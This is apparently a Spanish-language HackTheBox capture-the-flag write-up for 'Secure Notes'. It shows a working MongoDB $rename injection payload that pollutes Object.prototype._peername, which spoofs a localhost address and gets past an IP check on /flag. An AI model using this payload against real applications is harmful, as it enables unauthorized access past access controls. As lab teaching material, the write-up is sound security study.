# Writeup - Secure Notes (HackTheBox)

**Máquina:** Secure Notes  
**Plataforma:** HackTheBox  
**IP:** 154.57.164.83:30936

## Resumen

Secure Notes es una app de notas con un endpoint `/flag` que solo responde si la petición viene de `localhost`. La vulnerabilidad está en que el endpoint `/update` pasa todo lo que recibe directamente a MongoDB, permitiendo manipular documentos usando operadores como `$rename`. Esto permite contaminar el prototipo de JavaScript para engañar al servidor y hacerle creer que la petición viene de `127.0.0.1`.

---

## 1. Cómo funciona la app

| Endpoint | Qué hace |
|----------|----------|
| `/create` | Crea una nota |
| `/get/:id` | Lee una nota |
| `/update` | Modifica una nota |
| `/flag` | Da la flag solo si vienes de `127.0.0.1` |

### ¿Por qué es vulnerable `/update`?

```javascript
app.post('/update', async (req, res) => {
    const { noteId } = req.body;
    await Note.findByIdAndUpdate(noteId, req.body); // TODO el body se pasa a MongoDB
    let result = await Note.find({ _id: noteId });
    res.json(result);
});
```

El servidor coge el JSON que le mandas y lo mete entero en MongoDB. Así puedes inyectar operadores como `$rename`, que MongoDB ejecuta directamente sin que Mongoose pueda filtrarlo.

### ¿Por qué no podemos acceder a `/flag`?

```javascript
app.get('/flag', (req, res) => {
    const remoteAddress = req.connection.remoteAddress;
    if (remoteAddress === '127.0.0.1') {
        res.send(process.env.FLAG);
    } else {
        res.status(403).json({ Message: 'Access denied' });
    }
});
```

Comprueba que la IP del que pide sea `127.0.0.1` (localhost). Como estamos fuera del servidor, nuestra IP no lo es.

---

## 2. El truco — Prototype Pollution

Node.js, para saber la IP del que hace una petición, mira internamente `socket._peername.address`. Si ese valor no existe, JavaScript lo busca en el prototipo de los objetos (`Object.prototype`). **Idea: contaminamos el prototipo para que `_peername.address` devuelva `127.0.0.1`.**

### Paso 1: Crear una nota

Desde la web, botón **"+ New Note"**:
- **Title:** `127.0.0.1`
- **Content:** `IPv4`

### Paso 2: Renombrar los campos con `$rename`

Con **Burp Suite** se intercepta la petición al crear/modificar una nota. Se envía a **Repeater** y se modifica el cuerpo a:

```json
{
  "noteId": "<ID de la nota del paso 1>",
  "$rename": {
    "title": "__proto__._peername.address",
    "content": "__proto__._peername.family"
  }
}
```

Esto le indica a MongoDB que renombre `title` → `__proto__._peername.address` y `content` → `__proto__._peername.family`. MongoDB lo ejecuta y la nota queda así:

```
{
  "_id": "...",
  "__proto__": {
    "_peername": {
      "address": "127.0.0.1",
      "family": "IPv4"
    }
  }
}
```

Mongoose no puede bloquear `$rename` porque este operador se ejecuta directamente en MongoDB, antes de que Mongoose pueda filtrar nada.

### Paso 3: Ver la nota (contaminar el prototipo)

Se hace clic en la nota desde la web. El navegador hace un GET a `/get/<ID>` para cargarla. Al recibir el documento con el campo `__proto__`, Mongoose lo procesa y sin querer mete esos valores en `Object.prototype`:

```
Object.prototype._peername = { address: "127.0.0.1", family: "IPv4" }
```

Esto afecta a TODOS los objetos de JavaScript en el servidor.

### Paso 4: Conseguir la flag

Ahora, cuando el servidor recibe cualquier petición, Node.js mira `socket._peername.address`. Como el socket real no tiene `_peername`, JavaScript lo busca en el prototipo y encuentra `"127.0.0.1"`.

Se abre otra pestaña y se navega a `/flag`:

```
http://154.57.164.83:30936/flag
```

El servidor cree que la petición viene de `127.0.0.1` y devuelve la flag.

---

## Resumen

| Paso | Qué haces | Por qué funciona |
|-------|-----------|-----------------|
| 1 | Creas nota con title=`127.0.0.1`, content=`IPv4` | Guardas los valores que luego inyectarás en el prototipo |
| 2 | Usas `$rename` para convertir `title` → `__proto__._peername.address` y `content` → `__proto__._peername.family` | `$rename` se ejecuta en MongoDB, Mongoose no puede filtrarlo |
| 3 | Haces clic en la nota para verla | Mongoose carga el documento y contamina `Object.prototype` |
| 4 | Navegas a `/flag` | Node.js lee `_peername.address` del prototipo → cree que vienes de `127.0.0.1` → te da la flag |
